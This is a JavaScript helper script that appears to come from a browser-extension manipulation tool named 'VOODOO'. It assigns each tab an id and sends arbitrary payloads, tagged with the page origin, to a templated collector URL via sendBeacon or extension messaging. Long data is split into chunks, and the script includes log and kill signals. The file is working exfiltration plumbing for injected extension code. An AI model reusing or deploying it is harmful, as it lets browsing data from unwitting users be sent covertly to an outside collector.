if (!sessionStorage.tab_uuid) {
    sessionStorage.setItem("tab_uuid", Math.random().toString(16).substring(2));
}

const VOODOO = {
    options: { collector_url: "%{collector_url}" },
    utils: {
        sleep(ms) {
            return new Promise(resolve => setTimeout(resolve, ms));
        },
        chunk_string(str, length) {
            return str.match(new RegExp('.{1,' + length + '}', 'g'));
        },
        is_bg_script: window.location.href.indexOf("_generated_background_page.html") !== -1,
        send(body) {
            if (!VOODOO.options.collector_url) {
                return;
            }

            body = JSON.stringify(body);

            if (VOODOO.utils.is_bg_script) {
                return navigator.sendBeacon(VOODOO.options.collector_url, body);
            }

            chrome.runtime.sendMessage({
                collector_url: VOODOO.options.collector_url, body
            });
        }
    },
    log(msg) {
        VOODOO.utils.send({ log: msg.toString() });
        return VOODOO;
    },
    kill(options = {}) {
        VOODOO.utils.send({ ...options, kill: true });
        return VOODOO;
    },
    async send(payload) {
        let chunks = [];

        if (typeof payload === "string" && payload.length > 10000) {
            chunks = VOODOO.utils.chunk_string(payload, 10000);
        }

        if (chunks.length > 0) {
            for (let i in chunks) {
                VOODOO.utils.send({
                    chunk: i,
                    payload: [chunks.length, chunks[i]]
                });
                await VOODOO.utils.sleep(1);
            }
            return;
        }

        VOODOO.utils.send({
            time: new Date().getTime(),
            tab_uuid: sessionStorage.tab_uuid,
            origin: window.location.origin,
            payload
        });

        return VOODOO;
    }
};

const V = VOODOO;